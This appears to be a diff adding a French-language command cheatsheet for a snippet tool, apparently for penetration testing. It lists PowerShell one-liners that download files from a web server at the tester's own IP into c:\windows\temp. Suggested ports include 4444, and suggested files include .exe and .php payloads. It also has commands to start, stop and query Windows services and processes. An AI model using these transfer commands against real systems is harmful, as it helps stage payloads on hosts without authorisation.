@@ -1,0 +1,27 @@
+% download, windows, powershell
+
+# Télécharger le fichier depuis un serveur web
+echo powershell -c "Invoke-WebRequest -Uri 'http://<IP>:<PORT>/<FILE>' -OutFile '<DIRECTORY_OUT>\<FILE>'" | xclip -selection clipboard 
+
+# Télécharger le fichier depuis un serveur web
+echo powershell "(New-Object System.Net.WebClient).Downloadfile('http://<IP>:<PORT>/<FILE>')" | xclip -selection clipboard
+
+$ IP: ip -4 addr | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
+$ PORT: echo "21,22,80,443,1234,4444" | tr ',' '\n'
+$ FILE: echo "file.sh,file.exe,file.php,file.bat" | tr ',' '\n'
+$ DIRECTORY_OUT: echo "c:\windows\temp," | tr ',' '\n'
+
+% windows, service
+
+# Gérer les services windows
+echo sc <ETAT> <SERVICE> | xclip -selection clipboard
+
+# Afficher les services en cours
+echo powershell -c "Get-Service" | xclip -selection clipboard
+
+$ ETAT: echo "start,stop,query" | tr ',' '\n'
+
+% windows, processus
+
+# Démarrer un processus
+echo Start-Process <PROCESSUS> | xclip -selection clipboard
